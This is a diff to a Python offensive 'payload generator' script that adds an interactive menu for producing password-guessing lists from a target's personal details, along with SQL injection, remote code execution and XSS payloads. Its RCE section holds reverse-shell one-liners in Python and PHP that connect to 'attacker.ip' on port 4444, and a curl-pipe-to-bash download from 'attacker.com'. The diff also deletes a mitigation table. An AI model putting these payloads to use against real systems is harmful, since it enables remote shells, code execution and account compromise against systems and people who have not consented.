@@ -3,15 +3,9 @@ import sys
 import json
 import random
 import itertools
-import base64
-import hashlib
-import requests
-import re
-import uuid
 import math
 from datetime import datetime
 from typing import List, Dict, Any
-from concurrent.futures import ThreadPoolExecutor, as_completed
 from prettytable import PrettyTable
 
 class AdvancedPayloadGenerator:
@@ -100,10 +94,20 @@ class AdvancedPayloadGenerator:
         }
         return minimal_dicts.get(dictionary_type, [])
     
-    def generate_advanced_password_payloads(self, personal_info: Dict[str, Any]) -> List[str]:
+    def generate_advanced_password_payloads(self, personal_info: Dict[str, Any] = None) -> List[str]:
         """
         Advanced password payload generation with contextual and probabilistic mutations
         """
+        if personal_info is None:
+            # Prompt user for personal information if not provided
+            personal_info = {
+                'first_name': input("Enter first name: "),
+                'last_name': input("Enter last name: "),
+                'birthdate': input("Enter birthdate (YYYYMMDD): "),
+                'pet_name': input("Enter pet name: "),
+                'company': input("Enter company name: ")
+            }
+        
         base_words = [
             personal_info.get('first_name', ''),
             personal_info.get('last_name', ''),
@@ -172,6 +176,11 @@ class AdvancedPayloadGenerator:
         """
         Advanced SQL Injection Payload Generation
         """
+        # Prompt for SQL Injection specific context
+        print("\nSQL Injection Payload Generation:")
+        database_type = input("Enter database type (e.g., MySQL, PostgreSQL): ")
+        authentication_method = input("Enter authentication method (e.g., login, search): ")
+        
         base_injections = [
             "' OR '1'='1",
             "1' UNION SELECT NULL, NULL, version()--",
@@ -203,93 +212,74 @@ class AdvancedPayloadGenerator:
         """
         Remote Code Execution (RCE) Payload Generation
         """
+        # Prompt for RCE specific context
+        print("\nRemote Code Execution Payload Generation:")
+        os_type = input("Enter target operating system (e.g., Linux, Windows): ")
+        programming_language = input("Enter programming language (e.g., Python, PHP): ")
+        
         rce_payloads = [
-            "$(whoami)",
-            "`id`",
-            "system('ls')",
-            "eval('__import__(\\'os\\').system(\\'id\\')')",
-            "import os; os.system('whoami')",
-            "process.platform",
-            "__import__('subprocess').check_output(['ls'])",
-            "echo PAYLOAD | base64 -d | bash"
+            r"$(whoami)",
+            r"`id`",
+            r"system('ls')",
+            r"eval('__import__(\'os\').system(\'id\')')",
+            r"import os; os.system('whoami')",
+            r"process.platform",
+            r"__import__('subprocess').check_output(['ls'])",
+            r"echo PAYLOAD | base64 -d | bash"
         ]
         
         # Advanced OS Command Injection
         os_specific_payloads = [
-            "$(curl http://attacker.com/malware | bash)",
-            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.ip\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
-            "php -r '$sock=fsockopen(\"attacker.ip\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+            r"$(curl http://attacker.com/malware | bash)",
+            r"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.ip\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+            r"php -r '$sock=fsockopen(\"attacker.ip\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
         ]
         
         self.payload_storage['rce'] = list(set(rce_payloads + os_specific_payloads))
         return self.payload_storage['rce']
     
-    def perform_payload_analysis(self, payloads: List[str]) -> Dict[str, Any]:
+    def generate_xss_payloads(self) -> List[str]:
         """
-        Perform advanced payload analysis
+        Cross-Site Scripting (XSS) Payload Generation
         """
-        analysis_results = {
-            'total_payloads': len(payloads),
-            'payload_complexity': {},
-            'payload_tags': []
+        # Prompt for XSS specific context
+        print("\nCross-Site Scripting (XSS) Payload Generation:")
+        context = input("Enter context (e.g., input field, URL parameter): ")
+        
+        xss_payloads = [
+            r"<script>alert('XSS')</script>",
+            r"javascript:alert('XSS')",
+            r"<img src=x onerror=alert('XSS')>",
+            r"'><script>alert(document.cookie)</script>",
+            r"<svg onload=alert('XSS')>",
+            r"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/=[].constructor.constructor(alert())//'>",
+        ]
+        
+        # Contextual XSS Payloads
+        contextual_xss_payloads = [
+            fr"{context}><script>alert('XSS in {context}')</script>",
+            fr"'\"{context}><script>alert(document.cookie)</script>",
+        ]
+        
+        self.payload_storage['xss'] = list(set(xss_payloads + contextual_xss_payloads))
+        return self.payload_storage['xss']
+    
+    def generate_payload(self, payload_type: str) -> List[str]:
+        """
+        Generate payloads based on selected type
+        """
+        payload_generators = {
+            'password_bruteforce': self.generate_advanced_password_payloads,
+            'sql_injection': self.generate_advanced_sql_injection,
+            'rce': self.generate_advanced_rce_payloads,
+            'xss': self.generate_xss_payloads
         }
         
-        for payload in payloads:
-            analysis_results['payload_complexity'][payload] = {
-                'length': len(payload),
-                'entropy': self._calculate_entropy(payload)
-            }
+        if payload_type not in payload_generators:
+            print(f"Payload type {payload_type} not supported.")
+            return []
         
-        return analysis_results
-    
-    def generate_comprehensive_report(self):
-        """
-        Generate comprehensive payload generation report
-        """
-        report = {
-            'timestamp': datetime.now().isoformat(),
-            'payload_types': {},
-            'total_payloads': 0
-        }
-        
-        for payload_type, payloads in self.payload_storage.items():
-            report['payload_types'][payload_type] = {
-                'count': len(payloads),
-                'analysis': self.perform_payload_analysis(payloads)
-            }
-            report['total_payloads'] += len(payloads)
-        
-        with open('payload_generation_report.json', 'w') as f:
-            json.dump(report, f, indent=4)
-        
-        return report
-
-def display_vulnerabilities():
-    """
-    Display vulnerabilities in a formatted table
-    """
-    table = PrettyTable()
-    table.field_names = ["Vulnerability Type", "Description", "Potential Impact", "Mitigation Strategy"]
-    table.align["Description"] = "l"
-    table.align["Mitigation Strategy"] = "l"
-    
-    vulnerabilities = [
-        ["SQL Injection", "Manipulating SQL queries to access unauthorized data", "High", "Use parameterized queries, input validation"],
-        ["Password Bruteforce", "Attempting multiple password combinations", "High", "Implement account lockout, multi-factor authentication"],
-        ["Remote Code Execution", "Executing arbitrary system commands", "Critical", "Sanitize inputs, restrict system command execution"],
-        ["XSS (Cross-Site Scripting)", "Injecting malicious scripts into web pages", "Medium", "Implement content security policy, encode outputs"],
-        ["LDAP Injection", "Manipulating LDAP queries to bypass authentication", "High", "Validate and sanitize user inputs"],
-        ["Command Injection", "Executing system commands through application inputs", "Critical", "Use input validation, avoid shell execution"],
-        ["Deserialization", "Exploiting unsafe object deserialization", "High", "Use secure serialization libraries, validate data"],
-        ["XXE (XML External Entity)", "Exploiting XML parser vulnerabilities", "High", "Disable external entity processing"],
-        ["SSRF (Server-Side Request Forgery)", "Forcing server to make unintended network requests", "Medium", "Validate and restrict URL endpoints"],
-        ["OAuth Token Bypass", "Exploiting token generation and validation weaknesses", "Medium", "Implement robust token validation"]
-    ]
-    
-    for vuln in vulnerabilities:
-        table.add_row(vuln)
-    
-    return table
+        return payload_generators[payload_type]()
 
 def print_colorful_banner():
     """
@@ -306,6 +296,24 @@ def print_colorful_banner():
 """
     print(banner)
 
+def display_menu():
+    """
+    Display menu of payload generation options
+    """
+    print("\033[1;36m[*] Select Payload Type:\033[0m")
+    options = [
+        "1. Password Bruteforce",
+        "2. SQL Injection",
+        "3. Remote Code Execution (RCE)",
+        "4. Cross-Site Scripting (XSS)",
+        "5. Exit"
+    ]
+    
+    for option in options:
+        print(option)
+    
+    return input("\033[1;35mEnter your choice (1-5): \033[0m")
+
 def main():
     # Clear screen
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -316,36 +324,49 @@ def main():
     # Create generator instance
     generator = AdvancedPayloadGenerator()
     
-    # Example Usage
-    personal_info = {
-        'first_name': 'John',
-        'last_name': 'Doe',
-        'birthdate': '19900115',
-        'pet_name': 'Max',
-        'company': 'TechCorp'
-    }
-    
-    # Generate Payloads
-    print("\033[1;35m[*] Generating Password Payloads...\033[0m")
-    password_payloads = generator.generate_advanced_password_payloads(personal_info)
-    print(f"\033[1;32m[+] Generated {len(password_payloads)} Password Payloads\033[0m")
-    
-    print("\033[1;35m[*] Generating SQL Injection Payloads...\033[0m")
-    sql_payloads = generator.generate_advanced_sql_injection()
-    print(f"\033[1;32m[+] Generated {len(sql_payloads)} SQL Injection Payloads\033[0m")
-    
-    print("\033[1;35m[*] Generating RCE Payloads...\033[0m")
-    rce_payloads = generator.generate_advanced_rce_payloads()
-    print(f"\033[1;32m[+] Generated {len(rce_payloads)} RCE Payloads\033[0m")
-    
-    # Display Vulnerabilities
-    print("\n\033[1;36m[*] Vulnerability Landscape:\033[0m")
-    print(display_vulnerabilities())
-    
-    # Generate Comprehensive Report
-    print("\n\033[1;35m[*] Generating Comprehensive Report...\033[0m")
-    report = generator.generate_comprehensive_report()
-    print(f"\033[1;32m[+] Report Generated: payload_generation_report.json\033[0m")
+    while True:
+        # Display menu and get user choice
+        choice = display_menu()
+        
+        try:
+            if choice == '1':
+                payload_type = 'password_bruteforce'
+            elif choice == '2':
+                payload_type = 'sql_injection'
+            elif choice == '3':
+                payload_type = 'rce'
+            elif choice == '4':
+                payload_type = 'xss'
+            elif choice == '5':
+                print("\033[1;33m[*] Exiting Payload Generator. Stay Secure!\033[0m")
+                break
+            else:
+                print("\033[1;31m[!] Invalid choice. Please try again.\033[0m")
+                continue
+            
+            if choice != '5':
+                # Generate payloads
+                print(f"\n\033[1;35m[*] Generating {payload_type.replace('_', ' ').title()} Payloads...\033[0m")
+                payloads = generator.generate_payload(payload_type)
+                
+                # Display generated payloads
+                print("\n\033[1;32m[+] Generated Payloads:\033[0m")
+                for i, payload in enumerate(payloads, 1):
+                    print(f"{i}. {payload}")
+                
+                # Optional: Save payloads to a file
+                save_choice = input("\n\033[1;36mDo you want to save these payloads to a file? (y/n): \033[0m").lower()
+                if save_choice == 'y':
+                    filename = f"{payload_type}_payloads.txt"
+                    with open(filename, 'w') as f:
+                        for payload in payloads:
+                            f.write(payload + '\n')
+                    print(f"\033[1;32m[+] Payloads saved to {filename}\033[0m")
+                
+                input("\n\033[1;33mPress Enter to continue...\033[0m")
+        
+        except Exception as e:
+            print(f"\033[1;31m[!] An error occurred: {e}\033[0m")
 
 if __name__ == "__main__":
     try:
